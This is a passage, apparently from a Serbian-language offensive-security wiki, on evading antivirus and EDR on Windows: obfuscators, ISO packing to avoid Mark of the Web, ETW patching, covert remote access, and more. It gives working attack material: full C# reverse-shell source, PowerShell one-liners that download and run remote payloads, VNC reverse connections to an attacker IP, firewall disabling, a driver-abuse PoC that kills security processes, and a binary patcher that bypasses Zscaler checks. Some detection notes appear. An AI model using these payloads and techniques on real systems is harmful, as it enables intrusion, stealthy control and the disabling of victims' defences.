- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je framework za detaljnu obfuskaciju koda za jezike koje podržava LLVM, koristeći ROP (return-oriented programming). ROPfuscator obfuskuje program na nivou assembly koda tako što obične instrukcije pretvara u ROP chains i narušava uobičajenu predstavu o normalnom toku kontrole.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim-u.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da pretvori postojeće EXE/DLL fajlove u shellcode, a zatim da ih učita.

### Samomaskiranje pojedinačnih funkcija uz pomoć LLVM kompajlera

Umesto da maskira ceo implant samo dok je neaktivan, izmenjeni LLVM X86 backend može da drži odabrane funkcije XOR-maskirane kad god nisu aktivne. Function Peekaboo PoC bira demanglovana imena koja sadrže `REG_`, ubacuje position-independent ulazne i izlazne stubove oko završnog mašinskog koda i emituje jedan zajednički handler za maskiranje u `.text`; potpisi na nivou izvornog koda i Windows x64 calling convention ostaju nepromenjeni.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformacija control flow-a u backend-u

Ovo treba da se obavi nakon izbora instrukcija i optimizacije, jer transformacija mora da obuhvati **svaki emitovani return** i da zna tačan x86 raspored. `MachineFunctionPass` koji se pokreće pre emitovanja pronalazi poslednji `MachineInstr::isReturn()`, briše ga tako da se završna putanja nastavlja u dodati epilog, a ranije return instrukcije zamenjuje sa `JMP_1 handler`. Zadržite eventualno uklanjanje steka/frame-a koje je kompajler generisao pre svakog return-a; preusmerite samo samu return instrukciju.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `emitFunctionBodyEnd()` emituju stubove za pojedinačne funkcije, dok `emitEndOfAsmFile()` emituje handler. Simboli koji se dele između faza emitovanja omogućavaju da grana u prologu cilja kasniji epilog; za ručno emitovani near `je`, upišite `0F 84`, a zatim četvorobajtni MC izraz `target - address_after_je`. Pozivi i skokovi do handler-a mogu se umesto toga emitovati kao `MCInst` objekti (`CALL64pcrel32` i `JMP_1`). Pass mora da vrati `false` za neizabranu funkciju ako nije ništa promenio; PoC pogrešno vraća `true` u tom slučaju.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metapodaci i pre-CRT inicijalizacija

PoC smešta XOR ključ i zapise od 16 bajtova koji sadrže pokazivač na funkciju, koji je loader relocirao, i dužinu za vreme izvršavanja, u `.funcmeta`. Iako je C polje `uint32_t`, handler pristupa QWORD vrednosti na pomeraju `+8` u zapisu, čime čita dužinu i njeno popunjavanje, a zapise pomera za `0x10`. Imena PE sekcija imaju najviše osam bajtova, pa pretraga tokom izvršavanja vidi `.funcmet`. Spoljni patcher dodaje izvršni `.stub`, čuva stari RVA ulazne tačke u stub-u i preusmerava `AddressOfEntryPoint`; PIC stub dobija baznu adresu slike preko `gs:[0x60]` → `[PEB+0x10]`, prolazi kroz PE32+ imports da bi pronašao već importovani `VirtualProtect` i pokreće se pre CRT-a.<sup>[[38]](#references)[[39]](#references)</sup>

Inicijalizacija postavlja sentinel u `gs:[0xE8]` i poziva svaku funkciju iz metapodataka. Njen trajno čitljiv prolog upisuje početak funkcije u `gs:[0xF0]`, prepoznaje sentinel i preskače telo koje još nije maskirano. Epilog zatim koristi `call handler`; nakon što handler sačuva 13 registara (`0x68` bajtova), povratna adresa na `[rsp+0x68]` predstavlja kraj transformisane funkcije, pa se `end - start` može upisati u njen zapis metapodataka. Stub briše sentinel i skače na `ImageBase + original_entry_point_RVA` nakon što su sva tela maskirana.<sup>[[38]](#references)[[39]](#references)</sup>

Tokom uobičajenog poziva, prolog poziva isti simetrični handler da dekodira telo. Završna putanja nastavlja se u dodati epilog, dok se svaki raniji return preusmerava direktno na zajednički handler. Uobičajeni epilog takođe koristi `jmp handler`, a ne `call`, pa nakon ponovnog maskiranja `ret` instrukcija handler-a uzima povratnu adresu originalnog pozivaoca i čuva rezultat funkcije u `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva za maskiranje i indikatori za analizu

Handler pronalazi trenutni zapis, preskače fiksni vidljivi prolog (u ovoj verziji dug `0x46` bajtova), menja ostatak u `PAGE_EXECUTE_READWRITE`, XOR-uje ga bajt po bajt pomoću nižeg bajta ključa, a zatim mu postavlja zaštitu `PAGE_EXECUTE_READ`. Ista petlja zato dekodira pri ulasku, a kodira pri svakom uobičajenom izlasku.<sup>[[38]](#references)[[39]](#references)</sup>

Indikatori ovog dizajna sa visokom pouzdanošću uključuju:<sup>[[38]](#references)[[39]](#references)</sup>

- ulaznu tačku unutar izvršne sekcije `.stub` i sekciju `.funcmet` koja sadrži ključ i relocirane pokazivače u `.text`;
- parsiranje PEB-a, tabele import-a i tabele sekcija pre CRT-a, nakon čega slede pozivi preko svakog pokazivača iz metapodataka;
- identične PIC prologe `call`/`pop` i brojna mesta povratka preusmerena na jedan handler;
- upise u `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, praćene ponovljenim promenama zaštite pomoću `VirtualProtect` i bajt-po-bajt XOR upisima u izvršne stranice koje pripadaju slici.

Ovo je izbegavanje memory scanner-a, a ne kriptografska zaštita: zakrpljeni fajl i dalje sadrži originalno nemaskirano telo, a debugger može da postavi breakpoint na `VirtualProtect` ili XOR petlju i sačuva aktivnu funkciju. Jednobajtni XOR, čitljivi metapodaci i fiksna granica `0x46` takođe olakšavaju oporavak van mreže.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slot-ovi u PoC-u su lokalni za nit, ali izmenjene stranice koda su zajedničke celom procesu. Zato istovremen ili rekurzivan ulazak može ponovo da preokrene instrukcije dok ih drugi poziv izvršava; izuzeci i nenormalni izlazi takođe mogu da zaobiđu ponovno maskiranje. Robusna implementacija mora da sinhronizuje promene, vrati zaštitu koja je stvarno prosleđena kroz `lpflOldProtect`, izbegava hardkodirane dužine stub-a, proveri usklađenost steka x64 putanja `call` i `jmp`, i pozove `FlushInstructionCache` nakon izmene izvršnih bajtova. Microsoft izričito navodi da je pozivalac odgovoran za koherentnost instruction cache-a kada se izvršni kod menja.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen i MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih izvršnih fajlova sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen se uglavnom oslanja na reputaciju, što znači da će aplikacije koje se retko preuzimaju pokrenuti SmartScreen upozorenje i sprečiti krajnjeg korisnika da pokrene fajl (iako se fajl i dalje može pokrenuti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) pod nazivom Zone.Identifier, koji se automatski kreira pri preuzimanju fajlova sa interneta, zajedno sa URL-om sa kog su preuzeti.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani **pouzdanim** sertifikatom za potpisivanje **neće pokrenuti SmartScreen**.

Veoma efikasan način da sprečite da vaši payload-i dobiju Mark of The Web jeste da ih zapakujete u neku vrstu kontejnera, kao što je ISO. To je zato što Mark-of-the-Web (MOTW) **ne može** da se primeni na volumene koji **nisu NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u izlazne kontejnere kako bi izbegao Mark-of-the-Web.

Primer korišćenja:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payload-a u ISO datoteke pomoću [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za beleženje događaja u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **beleže događaje**. Međutim, bezbednosni proizvodi mogu da ga koriste i za nadgledanje i otkrivanje zlonamernih aktivnosti.

Slično kao što se AMSI onemogućava (zaobilazi), moguće je i podesiti da funkcija **`EtwEventWrite`** procesa u korisničkom prostoru odmah vrati kontrolu bez beleženja događaja. To se postiže izmenom funkcije u memoriji tako da odmah vrati kontrolu, čime se efektivno onemogućava ETW beleženje za taj proces.

Više informacija možete pronaći u **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Učitavanje C# binarnih datoteka u memoriju poznato je već duže vreme i još uvek je veoma dobar način za pokretanje post-exploitation alata bez otkrivanja od strane AV-a.

Pošto će payload biti učitan direktno u memoriju, bez upisivanja na disk, treba samo da brinemo o patchovanju AMSI-ja za ceo proces.

Većina C2 framework-a (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) već omogućava direktno izvršavanje C# assembly-ja u memoriji, ali postoje različiti načini za to:

- **Fork\&Run**

Ovaj metod podrazumeva **pokretanje novog žrtvenog procesa**, ubacivanje zlonamernog post-exploitation koda u taj novi proces, njegovo izvršavanje i gašenje novog procesa po završetku. Ovaj metod ima i prednosti i nedostatke. Prednost metode fork and run je što se izvršavanje odvija **izvan** našeg Beacon implant procesa. To znači da postoji **mnogo veća verovatnoća** da će naš **implant preživeti** ako nešto pođe po zlu tokom post-exploitation aktivnosti ili bude otkriveno. Nedostatak je **veća verovatnoća** da će vas otkriti **bihevioralne detekcije**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Ovaj metod podrazumeva ubacivanje zlonamernog post-exploitation koda **u sopstveni proces**. Tako možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV-a, ali ako nešto pođe po zlu tokom izvršavanja payload-a, postoji **mnogo veća verovatnoća** da ćete **izgubiti beacon**, jer proces može da se sruši.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o učitavanju C# assembly-ja, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# assembly-je možete učitavati i **iz PowerShell-a**; pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [video S3cur3th1sSh1t-a](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Korišćenje drugih programskih jezika

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), zlonamerni kod moguće je izvršavati i pomoću drugih jezika, tako što se kompromitovanoj mašini omogući pristup **okruženju interpretera instaliranom na SMB deljenom resursu kojim upravlja napadač**.

Omogućavanjem pristupa interpreter binarnim datotekama i okruženju na SMB deljenom resursu možete **izvršavati proizvoljan kod na tim jezicima u memoriji** kompromitovane mašine.

U repozitorijumu se navodi: Defender i dalje skenira skripte, ali korišćenjem Go-a, Java-e, PHP-a itd. imamo **više fleksibilnosti za zaobilaženje statičkih potpisa**. Testiranje nasumičnih, obfuskovanih reverse shell skripti na ovim jezicima pokazalo se uspešnim.

## TokenStomping

Token stomping menja access token bezbednosnog proizvoda kao što su EDR ili AV. Smanjivanje privilegija tokena može ostaviti proces pokrenutim, a istovremeno ga sprečiti da obavlja privilegovane provere ili aktivnosti sanacije.

Da bi se to sprečilo, Windows može da **spreči spoljne procese** da dobiju handles za tokene bezbednosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje pouzdanog softvera

### Chrome Remote Desktop

Kao što je opisano u [**ovoj objavi na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je instalirati Chrome Remote Desktop na računar žrtve, a zatim ga upotrebiti za preuzimanje kontrole i održavanje persistence-a:<sup>[[35]](#references)</sup>
1. Preuzmite ga sa https://remotedesktop.google.com/, kliknite na „Set up via SSH“, a zatim na MSI datoteku za Windows da biste je preuzeli.
2. Nečujno pokrenite instalacioni program na računaru žrtve (potrebna su administratorska prava): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop-a i kliknite na Next. Čarobnjak će zatražiti autorizaciju; kliknite na dugme Authorize da biste nastavili.
4. Izvršite navedenu komandu uz potrebne izmene: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametar `--pin` postavlja PIN bez korišćenja GUI-ja).
 

## Napredna evazija

Evazija je veoma komplikovana tema. Ponekad morate uzeti u obzir mnogo različitih izvora telemetrije u jednom sistemu, pa je u zrelim okruženjima gotovo nemoguće ostati potpuno neotkriven.

Svako okruženje na koje naiđete imaće svoje prednosti i slabosti.

Toplo preporučujem da pogledate ovo predavanje od [@ATTL4S](https://twitter.com/DaniLJ94) da biste se upoznali sa naprednijim tehnikama evazije.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je još jedno odlično predavanje od [@mariuszbit](https://twitter.com/mariuszbit) o evaziji u dubinu.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare tehnike**

### **Provera koje delove Defender prepoznaje kao zlonamerne**

Možete da koristite [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), koji će **uklanjati delove binarne datoteke** dok **ne utvrdi koji deo Defender prepoznaje** kao zlonameran, a zatim će ga izdvojiti.\
Još jedan alat koji radi **isto je** [**avred**](https://github.com/dobin/avred), uz javno dostupnu web-uslugu na adresi [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet server**

Do Windows10, sva izdanja Windows-a imala su **Telnet server** koji ste mogli da instalirate (kao administrator) ovako:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Podesite da se **pokreće** pri pokretanju sistema i **pokrenite** ga sada:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Promenite telnet port** (stealth) i onemogućite firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebna su vam bin preuzimanja, a ne setup)

**NA HOSTU**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim premestite binarnu datoteku _**winvnc.exe**_ i **novo**kreiranu datoteku _**UltraVNC.ini**_ unutar **victim**

#### **Reverse connection**

**attacker** treba da **pokrene na svom** **hostu** binarnu datoteku `vncviewer.exe -listen 5900` kako bi bila **spremna** da prihvati povratnu **VNC connection**. Zatim na **victim** pokrenite winvnc daemon `winvnc.exe -run` i izvršite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste ostali neprimećeni, ne smete da radite sledeće:

- Nemojte pokretati `winvnc` ako je već pokrenut jer ćete izazvati [popup](https://i.imgur.com/1SROTTl.png). Proverite da li je pokrenut pomoću `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez datoteke `UltraVNC.ini` u istom direktorijumu jer će se otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` za pomoć jer ćete izazvati [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

U okviru GreatSCT-a:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sada **pokrenite listener** pomoću `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Trenutni Defender će veoma brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Koristite ga sa:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# uz korišćenje kompajlera

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuskatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje Pythona za primer izrade injectora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Ponesite sopstveni ranjivi driver (BYOVD) – Isključivanje AV/EDR-a iz kernel prostora

Storm-2603 je koristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući zaštitu krajnjih tačaka pre nego što instalira ransomware. Alat donosi **sopstveni ranjivi, ali *potpisani* driver** i zloupotrebljava ga za izvršavanje privilegovanih operacija u kernelu koje ne mogu da blokiraju čak ni AV servisi sa Protected-Process-Light (PPL) zaštitom.<sup>[[12]](#references)</sup>

Ključni zaključci
1. **Potpisani driver**: Datoteka koja se isporučuje na disk zove se `ServiceMouse.sys`, ali binarna datoteka je legitimno potpisani driver `AToolsKrnl64.sys` iz Antiy Labs-ovog „System In-Depth Analysis Toolkit“. Pošto driver ima važeći Microsoft potpis, učitava se čak i kada je uključena Driver-Signature-Enforcement (DSE) zaštita.
2. **Instalacija servisa**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Prvi red registruje drajver kao **kernel servis**, a drugi ga pokreće, tako da `\\.\ServiceMouse` postaje dostupan iz userland-a.
3. **IOCTL-ovi koje drajver izlaže**
   | IOCTL code | Mogućnost                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Prekinuti proizvoljan proces pomoću PID-a (koristi se za gašenje Defender/EDR servisa) |
   | `0x990000D0` | Izbrisati proizvoljnu datoteku sa diska |
   | `0x990001D0` | Ukloniti drajver i izbrisati servis |

   Minimalni C PoC:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Zašto funkcioniše**: BYOVD u potpunosti zaobilazi zaštite u korisničkom režimu; kod koji se izvršava u kernelu može da otvori *zaštićene* procese, prekine ih ili izmeni objekte kernela, bez obzira na PPL/PP, ELAM ili druge funkcije za ojačavanje bezbednosti.

Otkrivanje / ublažavanje
•  Omogućite Microsoftovu listu blokiranih ranjivih upravljačkih programa (`HVCI`, `Smart App Control`) da bi Windows odbio da učita `AToolsKrnl64.sys`.
•  Pratite kreiranje novih *kernel* servisa i šaljite upozorenja kada se upravljački program učita iz direktorijuma u koji svi mogu da upisuju ili kada nije na listi dozvoljenih.
•  Pratite ručke iz korisničkog režima ka prilagođenim objektima uređaja, a zatim i sumnjive pozive `DeviceIoControl`.

### Zaobilaženje Zscaler Client Connector provera stanja uređaja izmenom binarnih datoteka na disku

Zscalerov **Client Connector** lokalno primenjuje pravila o stanju uređaja i oslanja se na Windows RPC za prosleđivanje rezultata drugim komponentama. Dva loša dizajnerska izbora omogućavaju potpuno zaobilaženje provera:

1. Provera stanja uređaja obavlja se **u potpunosti na klijentskoj strani** (serveru se šalje logička vrednost).
2. Interne RPC krajnje tačke proveravaju samo da li je izvršna datoteka koja se povezuje **potpisana od strane Zscalera** (putem `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Izmenom četiri potpisane binarne datoteke na disku** moguće je neutralisati oba mehanizma:

| Binarna datoteka | Izmenjena originalna logika | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa svaka provera prolazi |
| `ZSAService.exe` | Indirektni poziv funkcije `WinVerifyTrust` | Zamenjen instrukcijama NOP ⇒ svaki proces (čak i nepotpisan) može da se poveže sa RPC cevima |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta tunela | Preskočene |

Primer minimalnog patchera:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nakon zamene originalnih datoteka i ponovnog pokretanja servisnog steka:

* **Sve** provere bezbednosnog stanja prikazuju **zeleno/usaglašeno**.
* Nepotpisani ili izmenjeni binarni fajlovi mogu da otvore RPC krajnje tačke imenovanih cevi (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler pravilima.

Ova studija slučaja pokazuje kako se odluke o poverenju donete isključivo na strani klijenta i jednostavne provere potpisa mogu zaobići pomoću nekoliko izmena bajtova.

## Zloupotreba pouzdane funkcionalnosti Microsoft Defender `BTR.sys`

Defenderov drajver **Boot-Time Removal** koristan je primer koji se razlikuje od klasičnog BYOVD-a. `BTR.sys` je legitimna Microsoft-om potpisana komponenta za sanaciju, bez greške oštećenja memorije i bez IOCTL interfejsa; nakon sticanja administratorskog pristupa i privilegije `SeLoadDriverPrivilege`, operater umesto toga može da falsifikuje privatnu transakciju sanacije i dobije predviđene operacije nad datotekama i registrima u Ring-0 režimu. Ovo je **primitiva za neutralizaciju AV/EDR-a nakon kompromitovanja, a ne početni pristup niti eskalacija privilegija**, a drajver se može izdvojiti iz resursa `BOOTTIMETOOL` u sopstvenom `MpEngine.dll` fajlu cilja, umesto da se uveze upadljiv drajver treće strane.<sup>[[36]](#references)</sup>

### Priprema jednokratnog drajvera

